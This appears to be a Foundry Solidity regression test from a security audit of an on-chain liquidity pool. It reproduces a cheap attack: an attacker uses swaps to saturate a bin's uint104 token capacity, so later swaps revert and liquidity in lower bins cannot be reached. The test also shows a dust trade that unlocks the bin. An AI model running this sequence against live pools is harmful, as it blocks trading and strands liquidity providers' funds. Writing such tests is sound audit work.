// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {console2} from "forge-std/Test.sol";
import {MetricOmmPoolBaseTest, MockPriceProvider, Q64} from "./MetricOmmPool.base.t.sol";
import {MetricOmmPool} from "../contracts/MetricOmmPool.sol";
import {MetricOmmPoolFactory} from "../contracts/MetricOmmPoolFactory.sol";
import {MetricOmmPoolDeployer} from "../contracts/MetricOmmPoolDeployer.sol";
import {PoolParameters} from "../contracts/types/FactoryOperation.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

/// @notice End-to-end regression for per-bin uint104 input-capacity exhaustion.
contract MetricOmmPoolUint104CapacityAuditTest is MetricOmmPoolBaseTest {
  uint256 internal constant TOKEN0_SCALE = 1e12; // 18 decimals normalized to token1's 30 decimals
  uint256 internal constant MAX_BIN_BALANCE = type(uint104).max;

  function setUp() public override {
    super.setUp();

    token0 = new MockERC20("18-decimal token", "T18", 18);
    token1 = new MockERC20("30-decimal token", "T30", 30);
    oracle = new MockPriceProvider();
    oracle.setTokens(address(token0), address(token1));
    oracle.setBidAndAskPrice(uint128(Q64), uint128(Q64 + 1));

    MetricOmmPoolFactory realFactory = new MetricOmmPoolFactory(address(this));
    poolDeployer = new MetricOmmPoolDeployer(address(realFactory));
    realFactory.setPoolDeployer(address(poolDeployer));
    factory = address(realFactory);

    uint256[] memory nonNegativeBinData = new uint256[](1);
    uint256[] memory negativeBinData = new uint256[](1);
    nonNegativeBinData[0] = 100;
    negativeBinData[0] = 100;

    pool = MetricOmmPool(
      realFactory.createPool(
        PoolParameters({
          token0: address(token0),
          token1: address(token1),
          priceProvider: address(oracle),
          extensions: new address[](0),
          extensionOrders: _emptyExtensionOrders(),
          extensionInitData: new bytes[](0),
          priceProviderTimelock: type(uint256).max,
          admin: admin,
          initialAmount0PerShareE18: 1e18,
          initialAmount1PerShareE18: 1e30,
          minimalMintableLiquidity: MINIMAL_MINTABLE_LIQUIDITY,
          adminSpreadFeeE6: 0,
          adminNotionalFeeE8: 0,
          adminFeeDestination: adminFeeDestination,
          curBinDistFromProvidedPriceE6: 0,
          nonNegativeBinDataArray: nonNegativeBinData,
          negativeBinDataArray: negativeBinData,
          salt: keccak256("uint104-capacity-audit")
        })
      )
    );

    _approveUsersForPool(address(pool));
    for (uint256 i; i < callers.length; ++i) {
      token0.mint(address(callers[i]), 100e18);
      token1.mint(address(callers[i]), 100e30);
    }
  }

  function test_standardHighDecimalsMakeCapacityLockReachableAndCheap() public {
    // At 30 internal decimals, uint104.max is only about 20.28 external
    // tokens. Seed slightly below that ceiling while the cursor is at zero.
    uint104 shares = uint104((MAX_BIN_BALANCE - TOKEN0_SCALE) / TOKEN0_SCALE);
    _addLiquidity(1, -1, 0, shares, 1);

    (uint104 token0Before,,,) = _binBalancesAndCursor();
    console2.log("initial token0 (scaled)", token0Before);
    console2.log("initial token0 (18-decimal raw)", uint256(token0Before) / TOKEN0_SCALE);

    // Move the cursor into the bin through an ordinary token1 -> token0 swap.
    // The attacker later exchanges the received token1-side value back, so
    // filling capacity does not require donating the full notional to the pool.
    uint128 upInput = uint128(uint256(token0Before) / 2);
    (int256 upDelta0, int256 upDelta1) = _swap(0, address(callers[0]), false, _i128ExactIn(upInput), type(uint128).max);

    (uint104 token0Mid, uint104 token1Mid, uint104 positionMid,) = _binBalancesAndCursor();
    assertGt(token0Mid, 0);
    assertGt(token1Mid, 0);
    assertGt(positionMid, 0);
    assertLt(positionMid, type(uint104).max);

    // Fill all whole external token0 units of remaining capacity. Because one
    // token0 wei maps to 1e12 scaled units, the sub-1e12 remainder cannot
    // accept even the smallest subsequent external input.
    uint256 capacityBefore = MAX_BIN_BALANCE - uint256(token0Mid);
    uint128 fillInputExternal = uint128(capacityBefore / TOKEN0_SCALE);
    assertGt(fillInputExternal, 0);
    (int256 downDelta0, int256 downDelta1) = _swap(0, address(callers[0]), true, _i128ExactIn(fillInputExternal), 0);

    (uint104 token0Locked, uint104 token1Locked, uint104 positionLocked,) = _binBalancesAndCursor();
    uint256 residualCapacity = MAX_BIN_BALANCE - uint256(token0Locked);
    console2.log("residual scaled capacity", residualCapacity);
    console2.log("minimum scaled token0 input", TOKEN0_SCALE);
    console2.log("token1 still available (scaled)", token1Locked);
    console2.log("cursor still inside bin", positionLocked);

    assertLt(residualCapacity, TOKEN0_SCALE, "another token0 wei still fits");
    assertGt(token1Locked, 0, "outgoing liquidity was exhausted rather than capacity");
    assertGt(positionLocked, 0, "cursor reached the boundary rather than locking inside the bin");

    // The revert in bin 0 also makes all liquidity in lower bins unreachable.
    (, uint104 token1BehindLock,,,) = _getBinState(-1);
    console2.log("token1 liquidity blocked in lower bin", token1BehindLock);
    assertGt(token1BehindLock, token1Locked, "no material downstream liquidity was blocked");

    // Value both legs at the 1:1 oracle mid. The attacker first buys token0,
    // then uses that token0 to saturate the bin in the reverse direction. The
    // net cost is only the tiny curve remainder, while an entire lower bin is
    // made unreachable.
    int256 attackCostScaled = (upDelta0 + downDelta0) * int256(TOKEN0_SCALE) + upDelta1 + downDelta1;
    console2.logInt(attackCostScaled);
    assertGt(attackCostScaled, 0, "test setup unexpectedly gave the attacker a profit");
    assertLt(
      uint256(attackCostScaled) * 1_000,
      uint256(token1BehindLock),
      "locking cost was not below 10 bps of downstream liquidity"
    );

    // The pool cannot partial-fill one token0 wei against the remaining token1;
    // the uint104 storage cast reverts the entire swap.
    vm.expectRevert();
    _swap(2, address(callers[2]), true, 1, 0);

    // An opposite-direction dust trade creates headroom and restores the path.
    _swap(2, address(callers[2]), false, 1e15, type(uint128).max);
    (uint104 token0AfterUnlock,,,) = _binBalancesAndCursor();
    assertGe(MAX_BIN_BALANCE - uint256(token0AfterUnlock), TOKEN0_SCALE);
    (int256 amount0Delta, int256 amount1Delta) = _swap(2, address(callers[2]), true, 1, 0);
    assertEq(amount0Delta, 1);
    assertLt(amount1Delta, 0);
  }

  function _binBalancesAndCursor()
    internal
    view
    returns (uint104 token0Balance, uint104 token1Balance, uint104 position, int8 binIdx)
  {
    (token0Balance, token1Balance,,,) = _getBinState(0);
    position = _getCurPosInBin();
    binIdx = _getCurBinIdx();
    assertEq(binIdx, 0, "test unexpectedly left the target bin");
  }
}
